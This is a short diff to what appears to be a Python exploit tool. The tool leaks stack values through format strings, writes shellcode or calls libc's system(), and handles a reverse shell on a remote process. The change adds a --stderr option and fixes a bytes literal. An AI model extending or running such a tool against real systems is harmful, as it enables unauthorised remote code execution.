@@ -38,7 +38,7 @@ def handleReverseShell():
         noEOF = False
 
     # Create terminal input with option to automatically redirect stderr to stdout
-    commandModifier = ""
+    commandModifier = b""
     if redirectStdErr:
         commandModifier = b" 2>&1"
     while noEOF:
@@ -367,6 +367,7 @@ if __name__ == "__main__":
     parser.add_argument('--port', '-p', type=str, help='The port for the remote process.')
     parser.add_argument('--libc', '-l', type=str, help='Specifies the libc version to use.')
     parser.add_argument('--arch', '-a', type=str, help='The architecture of the process, x86 or x86-64.')
+    parser.add_argument('--stderr', '-se', type=str, help='Whether the program should redirect stderr to stdout for the terminal.')
     parser.add_argument('--shellcode', '-s', type=str, help='Whether to use shellcode instead of libc\'s system().')
     parser.add_argument('--to-stack', '-ws', type=str, help='Whether to write the shellcode to the stack or to libc.')
     parser.add_argument('--printf-leaks', '-n', type=int, help='How many times to leak stack values using format strings.')
@@ -432,6 +433,10 @@ if __name__ == "__main__":
     # Whether to write shellcode to stack or to overwrite libc
     if args.to_stack:
         writeToStack = str2bool(args.to_stack, "--to-stack")
+    
+    # Whether to write shellcode to stack or to overwrite libc
+    if args.stderr:
+        redirectStdErr = str2bool(args.stderr, "--stderr")
 
     # The maximum number of stack leaks to perform
     if args.printf_leaks:
